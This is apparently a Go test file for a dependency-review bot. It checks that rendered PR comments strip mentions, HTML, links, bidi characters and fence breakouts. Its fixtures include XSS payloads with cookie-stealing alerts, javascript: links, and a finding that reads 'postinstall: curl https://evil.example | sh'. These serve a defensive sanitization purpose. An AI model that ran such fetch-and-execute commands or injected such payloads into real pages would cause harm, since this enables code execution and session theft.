package publish

import (
	"flag"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"unicode/utf8"

	"github.com/sadbox/dep-review/internal/model"
)

var update = flag.Bool("update", false, "rewrite golden files")

func golden(t *testing.T, name, got string) {
	t.Helper()
	path := filepath.Join("testdata", name+".golden")
	if *update {
		if err := os.MkdirAll("testdata", 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte(got), 0o644); err != nil {
			t.Fatal(err)
		}
		return
	}
	want, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("%v (run go test -update)", err)
	}
	if got != string(want) {
		t.Errorf("%s differs from golden:\n--- got\n%s\n--- want\n%s", name, got, want)
	}
}

var hostile = map[string]string{
	"mentions":   "Ping @sadbox and @org/team, cc user@example.com",
	"script":     "Fine.<script>alert(document.cookie)</script><img src=x onerror=alert(1)> done",
	"links":      "See [the docs](https://evil.example/x) and ![img](https://evil.example/p.png) and [ref][1]\n[1]: https://evil.example",
	"javascript": "Click [x](javascript:alert(1)) now",
	"issues":     "Fixes #123, see GH-4 and other/repo#56; color #fff stays",
	"bidi":       "safe\u202Etxt.exe\u2066hidden\u2069 zero\u200Bwidth\uFEFFbom",
	"nul":        "a\x00b\x01c\x1bd\x7fe",
	"fence":      "```\nclosed the fence\n```\n~~~ and `inline`",
	"html-ent":   "&lt;b&gt; and <!-- comment --> and <details><summary>x</summary>",
	"newlines":   "line1\r\nline2\rline3\n\n\n\n\nline4   ",
	"invalid":    "bad \xff\xfe utf8",
	"pipes":      "a | b || c",
}

func TestSanitizeSummaryGolden(t *testing.T) {
	var b strings.Builder
	for _, k := range sortedKeys(hostile) {
		b.WriteString("== " + k + "\n" + SanitizeSummary(hostile[k]) + "\n")
	}
	golden(t, "sanitize_summary", b.String())
}

func TestInlineGolden(t *testing.T) {
	var b strings.Builder
	for _, k := range sortedKeys(hostile) {
		b.WriteString("== " + k + "\n" + Inline(hostile[k]) + "\n")
	}
	golden(t, "sanitize_inline", b.String())
}

func TestSanitizeInvariants(t *testing.T) {
	huge := strings.Repeat("@everyone <b>x</b> [l](u) #1 `` \u202E", 100<<10/30)
	for _, in := range append(sortedValues(hostile), huge) {
		for name, out := range map[string]string{"summary": SanitizeSummary(in), "inline": Inline(in)} {
			if strings.Contains(out, "@") || strings.Contains(out, "`") || strings.ContainsAny(out, "<>\x00\u202E\u2066\u200B\uFEFF") {
				t.Errorf("%s(%.40q) = %.80q still has markup", name, in, out)
			}
			if !utf8.ValidString(out) {
				t.Errorf("%s: invalid UTF-8", name)
			}
			if strings.Contains(out, "](") {
				t.Errorf("%s(%.40q) kept a link", name, in)
			}
		}
	}
	if n := utf8.RuneCountInString(SanitizeSummary(huge)); n > summaryMax+len(" [truncated]") {
		t.Errorf("summary not capped: %d runes", n)
	}
	if n := utf8.RuneCountInString(Inline(huge)); n > 2*inlineMax+len(" [truncated]") {
		t.Errorf("inline not capped: %d runes", n)
	}
	if strings.Contains(Inline("a\nb"), "\n") {
		t.Error("inline kept a newline")
	}
}

func TestCommentGolden(t *testing.T) {
	hostileSummary := "I read every diff. @sadbox please merge <script>x</script> [click](javascript:alert(1)) fixes #12\n```\nbreak out\n```\u202E" + strings.Repeat("A", 4000)
	verdict := &model.Verdict{Verdict: model.Pass, Flags: nil, Summary: hostileSummary}
	pub := class()
	pub.Private = false
	unverified := class()
	unverified.Kind = model.KindDependabotUnverified
	unverified.Reason = "commit 333333333333 is not authored by dependabot[bot]"
	ev := evidence(model.RouteHuman, []model.Update{
		{Ecosystem: model.NPM, Directory: "/web", Name: "@scope/pkg|x", From: "1.0.0", To: "1.1.0", Type: model.Minor, Direct: true, Security: true, Advisory: []string{"GHSA-2c8g-pr4w-hjxw"}},
		{Ecosystem: model.NPM, Directory: "/web", Name: "left-pad`<img src=x>", From: "0.1.0", To: "0.2.0", Type: model.Minor},
	}, model.Finding{Code: "npm.install-script-added", Route: model.RouteHuman, Update: "@scope/pkg|x", Detail: "postinstall: curl https://evil.example | sh @attacker"})
	tests := []struct {
		name string
		d    commentData
	}{
		{"merge_private", commentData{Class: class(), Evidence: evidence(model.RouteReview, patch),
			Outcome: Outcome{Decision: model.DecisionMerge, Route: model.RouteReview, State: StateSuccess, Reason: "checks passed and the reviewer approved; merging when CI is green", Verdict: verdict},
			RunURL:  "https://github.com/o/r/actions/runs/42"}},
		{"merge_public", commentData{Class: pub, Evidence: evidence(model.RouteReview, patch),
			Outcome: Outcome{Decision: model.DecisionMerge, Route: model.RouteReview, State: StateSuccess, Reason: "approved", Verdict: verdict}}},
		{"human_findings", commentData{Class: class(), Evidence: ev, Marker: marker{Notified: []string{baseSHA}},
			Outcome: Decide(Inputs{Class: class(), Evidence: ev, FetchResult: "success"})}},
		{"unverified", commentData{Class: unverified, Outcome: Decide(Inputs{Class: unverified})}},
		{"pending", commentData{Class: class(), Outcome: Decide(Inputs{Class: class(), FetchResult: "failure"})}},
		{"merge_failed", commentData{Class: class(), Evidence: evidence(model.RouteAuto, noop), MergeNote: "CI failed (2 failing checks)",
			Outcome: Decide(Inputs{Class: class(), Evidence: evidence(model.RouteAuto, noop), FetchResult: "success"})}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := renderComment(tt.d)
			golden(t, "comment_"+tt.name, got)
			if !strings.HasPrefix(got, markerPrefix) {
				t.Error("no marker")
			}
			if m, ok := parseMarker(got); !ok || len(m.Notified) != len(tt.d.Marker.Notified) {
				t.Errorf("marker round trip: %+v", m)
			}
			if strings.Count(got, "```") > 2 {
				t.Error("summary broke out of its fence")
			}
			if strings.Contains(got, "@sadbox") || strings.Contains(got, "@attacker") || strings.Contains(got, "<script") || strings.Contains(got, "<img") {
				t.Error("hostile text survived")
			}
			if !tt.d.Class.Private && strings.Contains(got, "I read every diff") {
				t.Error("summary shown on a public repository")
			}
		})
	}
	golden(t, "comment_stuck", renderStuck(headSHA, marker{Stuck: []string{headSHA}}))
}

func TestMarker(t *testing.T) {
	m, ok := parseMarker("<!-- dep-review:v1 notified=" + headSHA + ",zzz," + baseSHA + " stuck= -->\nbody")
	if !ok || len(m.Notified) != 2 || len(m.Stuck) != 0 {
		t.Fatalf("%+v %v", m, ok)
	}
	if _, ok := parseMarker("hello <!-- dep-review:v1 -->"); ok {
		t.Error("marker accepted mid-body")
	}
	var list []string
	for i := 0; i < 30; i++ {
		list = add(list, strings.Repeat(string(rune('a'+i%6)), 39)+string(rune('0'+i%10)))
	}
	if len(list) > maxMarkerShas {
		t.Errorf("marker list not capped: %d", len(list))
	}
	body := replaceMarker(m.String()+"\nrest", marker{Stuck: []string{headSHA}})
	if !strings.HasSuffix(body, "\nrest") || !strings.Contains(body, "stuck="+headSHA) {
		t.Errorf("replaceMarker: %q", body)
	}
}

func sortedKeys(m map[string]string) []string {
	var ks []string
	for k := range m {
		ks = append(ks, k)
	}
	for i := range ks {
		for j := i + 1; j < len(ks); j++ {
			if ks[j] < ks[i] {
				ks[i], ks[j] = ks[j], ks[i]
			}
		}
	}
	return ks
}

func sortedValues(m map[string]string) []string {
	var vs []string
	for _, k := range sortedKeys(m) {
		vs = append(vs, m[k])
	}
	return vs
}
